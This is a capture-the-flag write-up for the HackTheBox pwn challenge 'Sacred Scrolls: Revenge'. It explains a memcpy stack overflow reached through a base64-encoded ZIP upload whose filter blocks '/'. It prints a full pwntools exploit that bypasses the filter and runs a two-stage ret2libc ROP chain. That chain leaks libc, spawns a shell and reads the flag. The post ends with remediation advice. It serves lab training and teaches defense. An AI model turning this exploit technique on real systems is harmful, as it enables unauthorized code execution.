---
title: "Sacred Scrolls: Revenge"
date: 2027-01-23 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, ret2libc, rop, buffer-overflow, base64, charset-filter]
description: "A Very Easy Pwn challenge that hides a textbook stack overflow behind a delivery puzzle: the ROP payload must travel inside a base64-encoded ZIP, and the upload routine rejects the '/' character that lives in the base64 alphabet. The real work is forcing a binary ROP chain to encode to slash-free base64 by shifting the ZIP's stream alignment, then a No-PIE two-stage ret2libc drops a shell."
---

## Overview

`Sacred Scrolls: Revenge` is a Very Easy HackTheBox **Pwn** challenge from the 2022
University CTF. You get a binary, the matching glibc 2.35, and a remote service. The
binary has an obvious [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html),
but you can't just throw a ROP chain at it — every payload has to be smuggled in as a
**base64-encoded ZIP**, and the upload routine filters out `/`, which is part of the
base64 alphabet. So the puzzle is: make a binary ROP chain encode to slash-free base64.

## The technique

`checksec` shows **No canary, No PIE (base `0x400000`), NX, Full RELRO**. The program is a
three-option menu:

1. **Upload** — `read(0, buf, 0x1ff)`, a character filter that allows only
   `[A-Za-z0-9.+=\0]` (note: **`/` is rejected**), then runs
   `echo '<input>' | base64 -d > spell.zip`.
2. **Read** — `system("unzip spell.zip")`, reads `spell.txt`, and requires it to start with
   the 7-byte "boy who lived" signature `👓⚡` (`f0 9f 91 93 e2 9a a1`). `main` then copies
   200 bytes of it onto the stack.
3. **Leave** — `spell_save()` runs `memcpy(dst[32], src, 0x258)` — **600 bytes into a
   32-byte buffer**. Saved RIP sits at **offset 40** (7-byte signature + 25 pad + 8 saved-rbp,
   the saved-rbp being consumed by `leave; ret`).

The catch is the transport. Base64 maps each 3 input bytes to 4 output characters
*positionally*. A `/` (the sextet `111111`) produced by a **fixed** payload byte — typically
the `0x7f` high byte of a 64-bit libc pointer (`0x7f = 01111111`) — always lands on the same
sextet no matter what you append. A trailing pad can never remove it.

The fix has two levers:

- **Shift the stream alignment.** Give the ZIP entry a variable-length `extra` field
  (lengths 0/4/5/6/7/8 cover the three `mod 3` alignments). Changing where the data begins
  moves *every* later sextet boundary, sliding the offending byte onto a safe sextet. The
  extra-field tag bytes must themselves be base64-safe — use `0x41 'A'`; a `0xfe`/`0xff` tag
  encodes a `/`.
- **Brute a benign trailing pad.** Append `A`*n (perturbing CRC/size header bytes) until
  `base64(zip)` is clean and fits the input cap.

To keep the chain slash-light, the second stage reuses the **binary's own** `system@plt`
(a small static No-PIE address) so only the `/bin/sh` pointer carries a `0x7f` byte.

## Solution

The exploit is a No-PIE two-stage [ret2libc](https://cwe.mitre.org/data/definitions/121.html):

- **Stage 1 (leak):** `pop rdi ; system@got ; puts@plt ; main` → `puts` prints the runtime
  `&system`; `libc_base = leak − 0x50d60`; control returns to `main`.
- **Stage 2 (shell):** `pop rdi ; libc_base+/bin/sh ; ret ; system@plt`. The bare `ret`
  restores 16-byte stack alignment (libc `system` otherwise faults in a `movaps`).

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, io as _io, zipfile, base64
from pwn import *

context.arch = 'amd64'

POP_RDI    = 0x4011b3
RET        = 0x4007ce
PUTS_PLT   = 0x400800
SYSTEM_PLT = 0x400820
MAIN       = 0x400ee2
SYSTEM_GOT = 0x602f90
SAVED_RBP  = 0x602d48

SYSTEM_OFF = 0x50d60
BINSH_OFF  = 0x1d8698
SIG = b'\xf0\x9f\x91\x93\xe2\x9a\xa1'   # 👓⚡

def make_b64_zip(spell):
    def extra(L):
        return b'' if L == 0 else b'\x41\x41' + (L - 4).to_bytes(2, 'little') + b'\x41' * (L - 4)
    for elen in (0, 4, 5, 6, 7, 8):
        for pad in range(0, 600):
            buf = _io.BytesIO()
            zi = zipfile.ZipInfo('spell.txt', date_time=(1980, 1, 1, 0, 0, 0))
            zi.extra = extra(elen)
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
                z.writestr(zi, spell + b'A' * pad)
            b64 = base64.b64encode(buf.getvalue())
            if b'/' not in b64 and len(b64) < 500:
                return b64
    raise RuntimeError('no slash-free base64 zip')

def upload(io, b64):
    io.recvuntil(b'tag: '); io.sendline(b'1')
    io.recvuntil(b'>> ');   io.sendline(b'1')
    io.recvuntil(b'): ');   io.sendline(b64)

def fire(io):
    io.recvuntil(b'>> '); io.sendline(b'2')
    io.recvuntil(b'>> '); io.sendline(b'3')

io = remote(sys.argv[1], int(sys.argv[2]))
pad = b'a' * (32 - len(SIG))

rop1 = flat(POP_RDI, SYSTEM_GOT, PUTS_PLT, MAIN)
upload(io, make_b64_zip(SIG + pad + p64(SAVED_RBP) + rop1)); fire(io)
io.recvuntil(b'saved!'); io.recvline()
libc_base = u64(io.recvline().strip()[:8].ljust(8, b'\x00')) - SYSTEM_OFF
log.success('libc base: %#x' % libc_base)

rop2 = flat(POP_RDI, libc_base + BINSH_OFF, RET, SYSTEM_PLT)
upload(io, make_b64_zip(SIG + pad + p64(SAVED_RBP) + rop2)); fire(io)
io.recvuntil(b'saved!')
io.sendline(b'cat flag.txt; id')
io.interactive()
```

Run it against the instance:

```bash
python3 solve.py <ip> <port>
```

It leaks libc, returns to `main`, sends the second spell, and drops a shell as `ctf`:

```text
HTB{...}
uid=100(ctf) gid=101(ctf) groups=101(ctf)
```

(Flag value redacted.)

## Why it worked

Two independent mistakes combine: an unbounded `memcpy` with a hardcoded oversize length
gives the [stack overflow](https://cwe.mitre.org/data/definitions/121.html), and a charset
"filter" placed on the *encoded* transport — not on the decoded archive — is mistaken for a
security control. Because base64 is positional, the filter only constrains which *bytes* the
ROP chain may contain; shifting the ZIP's stream alignment re-rolls every encoded sextet, so
the constraint is geometric, not a real barrier.

## Fix / defense

- Bound the copy to the destination size: `memcpy(dst, src, sizeof(dst))` — never a hardcoded
  length larger than the buffer. Compile with a stack canary and PIE.
- Treat any externally-influenced length as hostile, and validate the **decoded** archive, not
  the encoded string. A charset check on base64 input is not authentication or sanitisation.
- Never hand attacker-controlled data to `system("unzip ...")`.
